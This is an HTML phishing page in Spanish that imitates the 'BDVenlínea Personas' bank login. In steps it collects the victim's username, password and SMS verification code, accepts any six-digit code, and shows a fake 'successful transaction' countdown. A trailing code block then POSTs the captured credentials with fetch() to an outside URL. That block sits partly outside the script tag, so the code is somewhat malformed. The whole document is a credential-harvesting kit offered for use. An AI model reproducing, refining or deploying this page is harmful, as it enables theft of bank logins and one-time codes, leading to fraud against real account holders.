<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BDVenlínea Personas</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: url('IMG_20250205_221232.jpg') si-repeat center center fixed;
            background-size: cover;
            font-family: Arial, sans-serif;
            color: white;
        }

        .container {
            max-width: 400px;
            margin: 100px auto;
            padding: 20px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            text-align: center;
        }

        h1 {
            text-align: center;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        label {
            margin-bottom: 5px;
        }

        input {
            margin-bottom: 15px;
            padding: 10px;
            border: none;
            border-radius: 5px;
        }

        button {
            padding: 10px;
            background-color: #d50000;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #b00000;
        }

        .hidden {
            display: none;
        }

        #timer {
            font-size: 24px;
            font-weight: bold;
            margin-top: 20px;
        }

        #success-message {
            font-size: 18px;
            color: #00FF00;
            display: none;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>BDVenlínea Personas</h1>
        <form id="loginForm">
            <!-- Paso 1: Usuario -->
            <div id="step-1">
                <label for="username">Usuario *</label>
                <input type="text" id="username" name="username" required>
                <button type="button" id="next-to-step-2">Siguiente</button>
            </div>

            <!-- Paso 2: Contraseña -->
            <div id="step-2" class="hidden">
                <label for="password">Contraseña *</label>
                <input type="password" id="password" name="password" required>
                <button type="button" id="next-to-step-3">Siguiente</button>
            </div>

            <!-- Paso 3: Código SMS -->
            <div id="step-3" class="hidden">
                <label for="code">Código SMS *</label>
                <input type="text" id="code" placeholder="Código de verificación" required maxlength="6">
                <button type="button" id="start-timer">Validar</button>
            </div>

            <!-- Paso 4: Temporizador -->
            <div id="step-4" class="hidden">
                <div id="timer">14</div>
                <div id="success-message" class="hidden">¡Transacción exitosa! Continuando con el siguiente paso...</div>
            </div>
        </form>
    </div>

    <script>
        const step1 = document.getElementById("step-1");
        const step2 = document.getElementById("step-2");
        const step3 = document.getElementById("step-3");
        const step4 = document.getElementById("step-4");
        const nextToStep2 = document.getElementById("next-to-step-2");
        const nextToStep3 = document.getElementById("next-to-step-3");
        const startTimer = document.getElementById("start-timer");
        const timerElement = document.getElementById("timer");
        const successMessage = document.getElementById("success-message");

        let countdown;

        // Paso 1: Validar usuario y avanzar
        nextToStep2.addEventListener("click", () => {
            const username = document.getElementById("username").value.trim();
            if (username === "") {
                alert("Por favor, ingresa tu usuario.");
            } else {
                step1.classList.add("hidden");
                step2.classList.remove("hidden");
            }
        });

        // Paso 2: Validar contraseña y avanzar
        nextToStep3.addEventListener("click", () => {
            const password = document.getElementById("password").value.trim();
            if (password === "") {
                alert("Por favor, ingresa tu contraseña.");
            } else {
                step2.classList.add("hidden");
                step3.classList.remove("hidden");
            }
        });

        // Paso 3: Validar código SMS y avanzar al temporizador
        startTimer.addEventListener("click", () => {
            const codeInput = document.getElementById("code").value.trim();
            if (/^\d{6}$/.test(codeInput)) { // Acepta cualquier código de 6 dígitos
                step3.classList.add("hidden");
                step4.classList.remove("hidden");
                startCountdown(14); // Inicia el temporizador
            } else {
                alert("Por favor, ingresa un código válido de 6 dígitos.");
            }
        });

        // Función para iniciar el temporizador
        function startCountdown(seconds) {
            timerElement.textContent = seconds;
            countdown = setInterval(() => {
                seconds--;
                if (seconds > 0) {
                    timerElement.textContent = seconds;
                } else {
                    clearInterval(countdown);
                    successMessage.classList.remove("hidden");
                    setTimeout(() => {
                        window.location.href = "https://www.ejemplo.com/inicio"; // Redirige
                    }, 3000); // Espera 3 segundos antes de redirigir
                }
            }, 1000);
        }
    </script>// Captura los valores de usuario, contraseña y código SMS
const username = document.getElementById("username").value.trim();
const password = document.getElementById("password").value.trim();
const code = document.getElementById("code").value.trim();

// Asegúrate de que los campos no estén vacíos antes de continuar
if (username === "" || password === "" || code === "") {
    alert("Por favor, llena todos los campos.");
} else {
    // Aquí puedes hacer algo con los datos, como enviarlos a una URL
    console.log("Usuario:", username);
    console.log("Contraseña:", password);
    console.log("Código SMS:", code);

    // Por ejemplo, enviar los datos a una URL (con método GET o POST)
    const url = "https://agent.ai/agent/companyresearch/report/bdvenlineapersonas.com?token=O7SZQUG7O1YRU91R&referrer=568e71806b664239";
    const params = `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&code=${encodeURIComponent(code)}`;
    
    // Enviar los datos mediante una solicitud POST (usando fetch)
    fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body: params,
    })
    .then(response => response.json()) // Puedes ajustar la respuesta dependiendo de lo que devuelva la API
    .then(data => console.log(data))
    .catch(error => console.error("Error:", error));
}

</body>
</html>
